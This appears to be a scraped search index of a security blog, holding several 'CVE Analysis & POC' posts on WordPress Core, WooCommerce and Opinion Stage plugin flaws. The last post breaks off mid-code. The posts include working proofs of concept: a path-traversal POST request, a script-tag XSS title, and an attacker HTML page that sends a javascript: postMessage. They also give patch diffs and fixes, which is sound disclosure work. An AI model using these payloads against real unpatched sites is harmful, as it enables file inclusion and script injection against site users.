''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } The patch adds multiple protections: type checking, prefix verification (\"opinionstage-\"), a whitelist (self::$allowed_templates), and blocking traversal characters. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rThe function prepare_view_file_name_form_current_page() is called from load_template(): public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() is invoked with 'admin/views/'.$view_file_name: public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } The require() call that causes LFI uses $path concatenated from the plugin path (plugin_path), $template_name, and .php: public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_MENU_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'View My Items', 'My Items', 'edit_posts', OPINIONSTAGE_MENU_SLUG ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'Tutorials \u0026 Help', 'Tutorials \u0026 Help', 'edit_posts', OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, 'load_template' ] ); } else { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, 'Get Started', 'Get Started', 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, 'load_template' ] ); } } } register_menu_page() registers two submenus with load_template as the callback, depending on the user’s login state. To access the admin submenu, the user must be logged into WordPress with at least Contributor privileges → therefore, the required privilege for this CVE is Contributor. Two slugs are declared for the submenus: const string OPINIONSTAGE_MENU_SLUG = \"opinionstage-settings\" const string OPINIONSTAGE_GETTING_STARTED_SLUG = \"opinionstage-getting-started\" ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLogin with a Contributor account Send a POST request: POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin X-PwnFox-Color: green Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 28 page=opinionstage-../payload Debugging: Debug - Value of $view_file_name Debug - Value of the $path being required A payload.php file was created for testing: \u003c?php echo \"ABC\"; Result Result of successful LFI ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Explain\rWe leverage how WordPress and the plugin handle parameters: WordPress determines the admin page based on the page in the URL, but the plugin reads page from $_REQUEST — and $_REQUEST will prioritize values from the request body when the request is a POST. Therefore we send a POST to admin.php?page=opinionstage-getting-started (a valid URL page to trigger the callback) while placing page=opinionstage-../payload in the POST body. As a result, WordPress accepts the URL and calls the callback, while the plugin reads page from $_REQUEST (the body) containing the ../ payload — allowing directory traversal and exploiting the LFI. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#explain"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-53328 is an LFI caused by using the page input without proper validation to build the file path for require() — the opinionstage- prefix is accepted but the remainder can contain .. / \\ to escape the views directory. The patch (v19.11.1) adds type checks, traversal blocking, and a template whitelist. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rDo not use user input directly to build paths for include/require. Apply a whitelist (or mapping) for template names. Block .., /, \\ or use realpath() and compare with the base directory. Update the plugin to 19.11.1 immediately. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin \u003c= 19.11.0 is vulnerable to Local File Inclusion ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analysis"],"collections":null,"content":"A Stored Cross Site Scripting (XSS) vulnerability occurs in WordPress Core prior to version 6.8.3. The root cause is improper input handling when generating dynamic pages, affecting the menu creation feature (nav menus). CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress Core Versions: v6.8.2 (vulnerable) and v6.8.3 (patched). Diff Tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. Theme - Astra: A very popular theme among WordPress users, which supports quick creation of nav menu items. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rWordPress is open source and its repository is on GitHub, so we can look at the commit related to the XSS fix to observe the changes and understand where the vulnerability occurs. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, In the vulnerable version, the value menuTitle is inserted into the \u003coption\u003e tag and rendered into HTML using jQuery’s html() method without any XSS prevention. The html() function replaces the HTML content inside the element, so if menuTitle contains malicious code it will be executed in the browser. Patched version: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { parentDropdown.append( $( '\u003coption\u003e', { value: menuID.toString(), selected: currentParentID === menuID, text: menuTitle, } ) ); } }); }); }); }, The patch fixes the issue by explicitly assigning menuTitle to the text property instead of injecting it into HTML. This ensures menuTitle is treated as plain text and cannot contain or execute malicious JavaScript. Thus, data added into the \u003coption\u003e element is safe and the XSS vector via menuTitle is eliminated. Comparison between vulnerable and patched versions ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rInspecting the code in the browser shows menuItems = #menu-to-edit li is an array of \u003cli\u003e elements inside the \u003cul\u003e with id=menu-to-edit Inspecting code in the browser The updateParentDropdown function iterates over the \u003cli\u003e elements, retrieves the value of the \u003cinput\u003e with class edit-menu-item-title, assigns that value to menuTitle inside an \u003coption\u003e tag, and renders it into HTML. Inspecting DOM after adding a menu In the UI: Display in the admin UI In the commit there is a change that seems useful but did not help the analysis. HTML entity encode (1) I used // to comment out all lines related to html_entity_decode of origin_title but was still able to exploit. Previously I had set debug points at those locations but nothing happened. Besides commenting them out, I selected the menu containing the XSS payload and clicked Add to Menu, capturing the request with Burp Suite to see whether the added value was HTML entity encoded. HTML entity encode (2) menu-item-title is the value taken from the input named menu-item[-5][menu-item-title] derived from the post-title, which is checked to add into the request body \u003cinput type=\"hidden\" class=\"menu-item-title\" name=\"menu-item[-5][menu-item-title]\" value=\"\u003cscript\u003ealert(document.domain)\u003c/script\u003e\"\u003e One interesting thing here: the browser takes the decoded HTML entity value to add into the request, meaning the value from the server was encoded before being echoed into HTML. Browser decodes HTML entity before sending 👉 The browser decoded the HTML entity before rendering the HTML. On the DOM, after clicking Add to Menu =\u003e attachTabsPanelListeners is called and appends the selected value to the bottom of the menu item list. Appending the item to the end of the menu list 👉 edit-menu-item-title contains the XSS payload. The updateParentDropdown function will take it and assign it to an \u003coption\u003e element =\u003e XSS occurs ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: post-title — the post title Sink: parentDropdown.html( $html ) which may contain malicious HTML $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rUse an Author account to create a post with a title containing an XSS payload An Admin visits the endpoint wp-admin/nav-menus.php and adds menus from the created post The JavaScript event is triggered Proof of Concept: XSS The \u003cscript\u003e tag inside an \u003coption\u003e within a \u003cselect\u003e can be executed, while other tags inside \u003coption\u003e are not — they only return the text inside. {: .prompt-info } When the browser parses the HTML string, the \u003cscript\u003e is not truly inside the \u003coption\u003e flow; the parser “lifts” the script out of the \u003coption\u003e and inserts it into the DOM tree. \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/option\u003e \u003c/select\u003e Therefore, the script executes immediately, while the \u003coption\u003e remains but its content is empty or displays nothing. Inspecting DOM after the script is lifted For other tags \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cb\u003eabd\u003c/b\u003e\u003c/option\u003e \u003c/select\u003e The browser follows the spec: \u003coption\u003e is text-only. When parsing \u003cb\u003e or \u003cimg\u003e inside an \u003coption\u003e: \u003cb\u003e is treated as text =\u003e the tag is removed, only “abd” is displayed as text. \u003cimg\u003e is removed entirely. Inspect: rendering option with inline elements ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-58674 demonstrates the risk of inserting user-controlled data directly into HTML via html() or innerHTML. A \u003cscript\u003e inside an \u003coption\u003e can be lifted out by the parser and executed, while other tags are stripped or treated as text. The patch uses the text property to ensure safety and eliminate XSS. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rDo not concatenate HTML strings from user data and insert them with html()/innerHTML. Use safe element creation APIs (option.text, document.createElement). Always escape/sanitize data both server-side and client-side. Understand parser behavior: \u003cscript\u003e can escape an inert container. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress Core \u003c= 6.8.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:6:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WooCommerce Plugin.","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe WooCommerce plugin for WordPress has a PostMessage-based Cross-Site Scripting (XSS) vulnerability via the ‘customize-store’ page in all versions up to and including 9.4.2, due to insufficiently safe handling of PostMessage data (no input sanitization and no escaping when output). This allows an unauthenticated attacker to inject arbitrary script into the site that will execute if they can trick a user into performing an action, for example clicking a link. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) and 9.4.3 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rIn the vulnerable version, attachParentListeners() listens to all messages from any origin without checking the origin; data from the message is assigned directly into the DOM which leads to PostMessage-Based XSS (a subtype of DOM‑based XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.2”} In the patched version, more checks and restrictions were added compared to the vulnerable version, moving from \"accept every message and redirect straight away\" to \"only accept trusted messages, validate structure and check the URL before navigation\". export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.3”} Diff — Comparison of source changes between the vulnerable and patched versions ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rAlthough I found the source and sink, when analyzing the plugin source after download I initially could not find the function attachParentListeners(). Search results for attachParentListeners() I thought my setup had failed and the code hadn’t been fully downloaded. But no — when searching for the keyword \"navigate\" I found a function with a different name but the same functionality as attachParentListeners(). Search results for “navigate” 👉 In the product build, to optimize browser load time the plugin used minification which removes whitespace, renames functions/variables to short names, and partially obfuscates the code making it harder to read. The downloaded file was named 5292.js instead of utils.js. After beautifying the code, I found 5292.js contains the utils.js code and many other files’ code. Visiting the customize-store page and sending a postMessage through the browser console: http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store An alert() event triggered when postMessage is sent from the browser console 👉 alert() is triggered. Using the browser debugger I checked which file 5292.js was loaded from in the browser. 5292.js from browser debugger ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: event.data from window.postMessage (specifically event.data.url) Sink: window.location.href = event.data.url ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a webpage with the following source: \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"openPopup\"\u003eOpen Popup\u003c/button\u003e \u003cscript\u003e let popup; document.getElementById(\"openPopup\").addEventListener(\"click\", () =\u003e { // Open a popup popup = window.open( \"http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store\", \"popupWindow\", \"width=400,height=300\" ); // Wait for the popup to load const interval = setInterval(() =\u003e { if (popup \u0026\u0026 !popup.closed) { // Send message popup.postMessage({ type: 'navigate', url: 'javascript:alert(\"phu0c ph4m\")' }, '*'); clearInterval(interval); } }, 5000); }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e An admin visits the webpage and clicks Open Popup. After 5s, the JavaScript event is triggered. JavaScript event from the popup 👉 Matches the CVE description. The popup cannot auto-open without a user interaction {: .prompt-info } Here, an \u003ciframe\u003e can’t be used because X-Frame-Options: SAMEORIGIN is set in the response — only same-origin embedding is allowed. X-Frame-Options: SAMEORIGIN is set in the response ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-5062 vulnerability in WooCommerce \u003c= 9.4.2 is a PostMessage‑based DOM XSS. An unauthenticated attacker can send a malicious message to the customize-store page causing the victim’s browser to execute script if the victim interacts (via popup/link). The 9.4.3 patch validates origin, verifies message structure, and whitelists URLs before redirecting. Key takeaways: PostMessage‑based DOM XSS can execute script when the user interacts (popup/link). Data from postMessage must always be treated as untrusted. Always validate origin, check the message structure and URL before redirecting. Update the plugin to the latest patched version to prevent exploitation. ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress WooCommerce \u003c= 9.3.2 and from 9.4 through 9.4.2 — CVE-2025-5062 ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rWordPress Core is vulnerable to Stored Cross-Site Scripting via the user’s display name in the Avatar block in multiple versions up to 6.5.2 due to insufficient output escaping of the display name. This allows authenticated attackers with contributor-level access or higher to inject arbitrary web scripts into pages — those scripts will execute whenever a user visits the page containing the injection. Additionally, it allows unauthenticated attackers to inject arbitrary web scripts into pages that contain a comment block showing the comment author’s avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:1:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) and 6.4.4 (patched). Diff tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:2:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rIn the vulnerable version, WP Core used esc_attr__() to translate the string and escape an HTML attribute before outputting to the browser, but it was implemented incorrectly. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; Here esc_attr__() translates and escapes the HTML before being passed to sprintf() to inject $author_name — therefore $author_name is not escaped. In the patched version, $author_name is passed into sprintf() first and then the full string is escaped with esc_attr(), which is safe against XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; Comparison between the vulnerable and patched versions ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rfunction render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] 